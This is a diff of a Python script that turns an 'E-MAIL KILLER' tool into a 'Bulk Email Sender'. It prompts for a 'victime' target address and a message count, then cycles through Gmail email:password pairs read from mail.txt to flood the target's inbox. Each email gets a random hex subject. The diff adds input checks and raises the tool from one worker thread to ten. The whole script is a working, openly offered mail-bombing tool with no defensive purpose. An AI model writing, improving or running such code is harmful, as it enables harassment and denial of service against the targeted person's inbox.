@@ -2,107 +2,137 @@
 import os
 import smtplib
 import sys
+import re
 from time import sleep
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-# Temizleme komutu
-os.system('clear' if os.name == 'posix' else 'cls')
-print("""
+# Renk kodları (256 renk pastel tonları)
+class Colors:
+    INFO = '\033[38;5;159m'      # Pastel Açık Mavi
+    SUCCESS = '\033[38;5;120m'   # Pastel Açık Yeşil
+    ERROR = '\033[38;5;210m'     # Pastel Açık Kırmızı
+    INPUT = '\033[38;5;229m'     # Pastel Açık Sarı
+    RESET = '\033[0m'            # Reset
 
+# Clear console (cross-platform)
+os.system('cls' if os.name == 'nt' else 'clear')
 
+# ASCII Banner
+print(f"""
+{Colors.INFO}
 
-oooooooooooo         ooo        ooooo       .o.       ooooo ooooo
-`888'     `8         `88.       .888'      .888.      `888' `888'
- 888                  888b     d'888      .8"888.      888   888
- 888oooo8             8 Y88. .P  888     .8' `888.     888   888
- 888    "    8888888  8  `888'   888    .88ooo8888.    888   888
- 888       o          8    Y     888   .8'     `888.   888   888       o
-o888ooooood8         o8o        o888o o88o     o8888o o888o o888ooooood8
+       #@@@@@@@@@@@@@@=
+      @* @@@@@@@@@@@@ %@
+      @@@ @@@@@@@@@@ @@@
+      @@@@ @@@@@@@@ @@@@      Bulk Email Sender
+      @@@@@ @@@@@@ @@@@@      Dev by @cyze{Colors.RESET}
+      @@@@@. *@@-. @@@@@      https://github.com/root-cyze
+      @@@@ @@#  @@@ @@@@
+      @@@ @@@@@@@@@@ @@@
+      @@ @@@@@@@@@@@@ @@
+      @ @@@@@@@@@@@@@@ @
+       @@@@@@@@@@@@@@@@
 
-
-
-oooo    oooo ooooo ooooo        ooooo        oooooooooooo ooooooooo.
-`888   .8P'  `888' `888'        `888'        `888'     `8 `888   `Y88.
- 888  d8'     888   888          888          888          888   .d88'
- 88888[       888   888          888          888oooo8     888ooo88P'
- 888`88b.     888   888          888          888    "     888`88b.
- 888  `88b.   888   888       o  888       o  888       o  888  `88b.
-o888o  o888o o888o o888ooooood8 o888ooooood8 o888ooooood8 o888o  o888o
-
------------------------> Coder : @archescyber ❤️ <-----------------------
 """)
 print(" ")
 
-# Alıcı e-posta ve mesaj bilgilerini kullanıcıdan alma
-victime = input('\033[94m[?]\033[97m E-Mail\033[91m To Be Sent\033[97m : \033[93m')
-print("")
-message = input('\033[94m[?]\033[97m Message:\033[92m : \033[93m')
-print(" ")
-hani = int(input('\033[94m[?] \033[97mNumber Of \033[92mE-Mail\033[97m : \033[93m'))
-print(" ")
-
-# SMTP_SERVER bilgileri
-smtp_server = 'smtp.gmail.com'
-port = 587
+# Validate email format
+def is_valid_email(email):
+    pattern = r'^[\w\.-]+@[\w\.-]+\.\w+$'
+    return re.match(pattern, email) is not None
 
 def clean_text(text):
-    # Temizleme fonksiyonu
-    return ' '.join(text.split())                                                                                                                       
-def send_email(email, passworde, victime, message, i):
+    return ' '.join(text.strip().split())
+
+# Get user inputs with validation
+while True:
+    victime = input(f'{Colors.INPUT}[INPUT]{Colors.RESET} Target E-Mail: ').strip()
+    if is_valid_email(victime):
+        break
+    print(f"{Colors.ERROR}[ERROR]{Colors.RESET} Invalid email format. Try again.")
+
+message = input(f'{Colors.INPUT}[INPUT]{Colors.RESET} Message to send: ').strip()
+
+while True:
     try:
-        # SMTP Bağlantısını kur
-        with smtplib.SMTP(smtp_server, port) as server:
+        hani = int(input(f'{Colors.INPUT}[INPUT]{Colors.RESET} Number of emails to send: '))
+        if hani <= 0:
+            raise ValueError
+        break
+    except ValueError:
+        print(f"{Colors.ERROR}[ERROR]{Colors.RESET} Please enter a valid positive integer.")
+
+# SMTP server info
+SMTP_SERVER = 'smtp.gmail.com'
+PORT = 587
+
+def send_email(email, password, recipient, message, count):
+    try:
+        with smtplib.SMTP(SMTP_SERVER, PORT) as server:
             server.ehlo()
             server.starttls()
             server.ehlo()
-            server.login(email, passworde)
+            server.login(email, password)
 
-            # E-postayı gönder
             subject = os.urandom(9).hex()
-            msg = f'Sender: {email}\nSubject: {subject}\n\n{message}'
-            server.sendmail(email, victime, msg)
+            msg = f"From: {email}\r\nTo: {recipient}\r\nSubject: {subject}\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n{message}"
 
-        print(f"\033[94m[✓]\033[97m E-Mail Sending \033[92mCompleted.\033[97m :\033[93m {i+1}")
+            server.sendmail(email, recipient, msg)
+
+        print(f"{Colors.SUCCESS}[SUCCESS]{Colors.RESET} Email #{count + 1} sent successfully from {email}")
     except smtplib.SMTPAuthenticationError:
-        print(f"\n\033[94m[•] \033[91mError: \033[97m")
-        print(f'\033[94m[•]\033[97m • \033[93mUsername\033[97m or \033[93mPassword\033[97m incorrect: {email}')
-        print("\033[94m[|] \033[97mTurn on two-step verification in email settings. Then, create an application called SMTP by typing the application password and use it with your e-mail address.")
+        print(f"{Colors.ERROR}[ERROR]{Colors.RESET} Authentication failed for {email}. Check username/password or app password.")
     except Exception as e:
-        print(f'\033[94m[|] \033[91mError: \033[97m{e}')
+        print(f"{Colors.ERROR}[ERROR]{Colors.RESET} Error sending email #{count + 1} from {email}: {e}")
 
-# Mail.txt dosyasını oku ve her bir satırı işleyerek e-posta gönder
-try:
-    with open('mail.txt', 'r', encoding='utf-8') as file:
-        lines = [clean_text(line.strip()) for line in file.readlines()]
+def load_email_password_pairs(filepath='mail.txt'):
+    pairs = []
+    try:
+        with open(filepath, 'r', encoding='utf-8') as file:
+            for line_num, line in enumerate(file, 1):
+                line = clean_text(line)
+                if ':' not in line:
+                    print(f"{Colors.ERROR}[ERROR]{Colors.RESET} Skipping invalid line {line_num} in '{filepath}': {line}")
+                    continue
+                email, password = line.split(':', 1)
+                email = clean_text(email)
+                password = clean_text(password)
+                if not is_valid_email(email):
+                    print(f"{Colors.ERROR}[ERROR]{Colors.RESET} Invalid email format in line {line_num}: {email}")
+                    continue
+                pairs.append((email, password))
+    except FileNotFoundError:
+        print(f"{Colors.ERROR}[ERROR]{Colors.RESET} File '{filepath}' not found.")
+        sys.exit(1)
 
-    valid_lines = [line for line in lines if ':' in line]  # Geçerli satırları filtrele
+    if not pairs:
+        print(f"{Colors.ERROR}[ERROR]{Colors.RESET} No valid email:password pairs found in '{filepath}'. Exiting.")
+        sys.exit(1)
 
-    if len(valid_lines) == 0:
-        raise ValueError("No valid email:password lines found in 'mail.txt'")
+    return pairs
 
-    # E-posta ve parola çiftlerini döngüde kullanmak için bir liste oluştur
-    email_password_pairs = [(line.split(':')[0], clean_text(line.split(':')[1])) for line in valid_lines]
+def main():
+    print(f"{Colors.INFO}[INFO]{Colors.RESET} Loading email:password pairs...")
+    email_password_pairs = load_email_password_pairs()
+    print(f"{Colors.INFO}[INFO]{Colors.RESET} Loaded {len(email_password_pairs)} account(s). Starting to send emails...")
 
-    if len(email_password_pairs) == 0:
-        raise ValueError("No valid email:password pairs found")
+    def worker(i):
+        email, password = email_password_pairs[i % len(email_password_pairs)]
+        send_email(email, password, victime, message, i)
+        sleep(0.5)
 
-    # E-posta gönderim işlevini çağıran bir yardımcı işlev
-    def process_email(i):
-        email, passworde = email_password_pairs[i % len(email_password_pairs)]
-        send_email(email, passworde, victime, message, i)
-        sleep(0.001)  # Örneğin, her e-posta gönderiminden sonra 0.001 saniye bekle
+    max_threads = min(10, hani)
 
-    # ThreadPoolExecutor kullanarak e-posta gönderimlerini paralel hale getirme
-    with ThreadPoolExecutor(max_workers=1) as executor:  # max_workers=1, her seferinde tek bir iş parçacığı kullanır
-        futures = [executor.submit(process_email, i) for i in range(hani)]
+    with ThreadPoolExecutor(max_workers=max_threads) as executor:
+        futures = [executor.submit(worker, i) for i in range(hani)]
 
         for future in as_completed(futures):
-            future.result()  # Herhangi bir exception oluşursa burada yakalanır
+            try:
+                future.result()
+            except Exception as e:
+                print(f"{Colors.ERROR}[ERROR]{Colors.RESET} Thread error: {e}")
 
-    print("")
-    print(f'\033[93m[✓]\033[97m All \033[97mMessages \033[92mSent.\033[97m ')
+    print(f"\n{Colors.SUCCESS}[SUCCESS]{Colors.RESET} All messages sent.")
 
-except FileNotFoundError:
-    print("\033[94m[|] \033[91mError: \033[97m' mail.txt' not found.")
-except Exception as e:
-    print(f'\033[94m[|] \033[91mError: \033[97m{e}')
+if __name__ == "__main__":
+    main()
